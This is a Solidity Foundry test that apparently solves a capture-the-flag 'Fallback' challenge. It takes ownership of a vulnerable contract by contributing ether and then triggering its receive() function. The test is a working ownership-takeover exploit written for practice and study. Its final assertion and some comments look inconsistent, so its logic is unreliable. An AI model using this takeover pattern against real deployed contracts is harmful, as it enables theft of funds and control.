// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import "../src/Fallback.sol";
import "forge-std/console.sol";

// To-do
// you claim ownership of the contract
//you reduce its balance to 0

/* 
The cotract (src/Fallback.sol) have the two possibilities
to claim the ownership of the contract:
1. By calling the contribute function
 - This is not feasible way to do because to claim the ownership
   through this function, we need to deposit ether than the original
   owner of contract , and that value must be more than 1000 * ether

2. receive() function also offers the possibility to claim the ownership
- This is the fallback function which will change the ownership of 
  contract if msg.sender is a contributor and the value which he transfer
  more than 0*/

contract FallbackTest is Test {
    Fallback public myContract;

    function setUp() public {
        myContract = new Fallback();
    }

    function testOwnership() public {
        //address contractOwner = myContract.owner();
        //address functionCaller = msg.sender;
        // To claim ownership, first need to be a contributor
        myContract.contribute{value: 0.004 ether}();
        //then we will send the some ether to the contract to execute the receive() function
        // the receive() function will change the ownership of the contract, if the it receives
        //the ether and find the msg.sender as a contributor
        payable(address(myContract)).transfer(4);
        assertEq(msg.sender, myContract.owner());
    }
}
